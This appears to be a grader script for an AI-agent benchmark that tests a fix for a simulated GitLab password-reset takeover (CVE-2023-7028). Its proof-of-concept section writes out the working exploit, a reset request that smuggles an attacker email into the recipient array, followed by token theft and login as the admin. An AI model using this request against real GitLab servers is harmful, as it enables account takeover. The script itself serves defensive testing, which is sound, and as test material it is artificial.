#!/bin/bash
# Scenario 14: GitLab password-reset account takeover (SIMULATION of
# CVE-2023-7028). Ground truth is BEHAVIOURAL against the LIVE service: the real
# exploit (request a reset for the victim with the attacker's address in the
# recipient array, read the token from the attacker's mailbox, reset the
# victim's password, then log in as the victim) must SUCCEED at baseline and be
# BLOCKED after the fix. A do-nothing agent leaves the takeover working.
set -u
IP=$(hostname -i 2>/dev/null | awk '{print $1}')
[ -z "$IP" ] && IP=127.0.0.1
B="http://$IP:80"

code_of() { curl -s -m 5 -o /dev/null -w '%{http_code}' "$@" 2>/dev/null || echo 000; }

# Wait for the service (do NOT start it — a dead daemon fails).
UP=0
for i in $(seq 1 20); do
    C=$(code_of "$B/users/sign_in")
    [ "$C" != "000" ] && { UP=1; break; }
    sleep 2
done
[ "$UP" = "1" ] || { echo "FAIL [Regression]: nothing serving on :80 (dead / not started)." >&2; exit 1; }

VICTIM="admin@local.test"
ATTACKER="attacker@evil.test"
NEWPW="HvPwned_$$"

###############################################################################
# PoC: run the REAL account-takeover exploit end to end.
###############################################################################
# 1) Request reset for the victim, sneaking the attacker's address into the array.
curl -s -m 5 -X POST "$B/users/password" \
    --data "user%5Bemail%5D%5B%5D=$VICTIM&user%5Bemail%5D%5B%5D=$ATTACKER" >/dev/null 2>&1 || true

# 2) Read the token from the ATTACKER's mailbox (an inbox the attacker controls).
MBOX=$(curl -s -m 5 "$B/dev/mailbox?email=$ATTACKER" 2>/dev/null || true)
TOKEN=$(printf '%s' "$MBOX" | grep -oE '[0-9a-f]{32}' | head -1)

if [ -n "$TOKEN" ]; then
    # 3) Use the stolen token to set a new password on the victim's account.
    curl -s -m 5 -X POST "$B/users/password" \
        --data "token=$TOKEN&user%5Bpassword%5D=$NEWPW" >/dev/null 2>&1 || true
    # 4) Confirm takeover: log in as the victim with the attacker-chosen password.
    LOGIN=$(code_of -X POST "$B/users/sign_in" \
        --data "user%5Blogin%5D=$VICTIM&user%5Bpassword%5D=$NEWPW")
    if [ "$LOGIN" = "200" ]; then
        echo "FAIL [PoC]: account takeover succeeded — attacker reset $VICTIM and logged in (CVE-2023-7028 exploitable)." >&2
        exit 1
    fi
fi
echo "PASS [PoC]: attacker received no reset token / could not log in as victim."

###############################################################################
# Regression 1: legitimate single-address reset still delivers to that account.
###############################################################################
curl -s -m 5 -X POST "$B/users/password" --data "user%5Bemail%5D=$VICTIM" >/dev/null 2>&1 || true
OWN=$(curl -s -m 5 "$B/dev/mailbox?email=$VICTIM" 2>/dev/null || true)
if ! printf '%s' "$OWN" | grep -qE '[0-9a-f]{32}'; then
    echo "FAIL [Regression]: legitimate password reset did not deliver a token to the account owner." >&2
    exit 1
fi
echo "PASS [Regression]: legitimate single-address reset delivers to the account owner."

###############################################################################
# Regression 2: the victim can still log in with the ORIGINAL password
# (takeover did not change it) and the login endpoint is healthy.
###############################################################################
ORIG=$(code_of -X POST "$B/users/sign_in" \
    --data "user%5Blogin%5D=$VICTIM&user%5Bpassword%5D=OrigAdminPass1")
if [ "$ORIG" = "200" ]; then
    echo "PASS [Regression]: victim's original credentials still valid; login healthy."
    exit 0
fi
echo "FAIL [Regression]: victim's original credentials no longer work (HTTP $ORIG)." >&2
exit 1
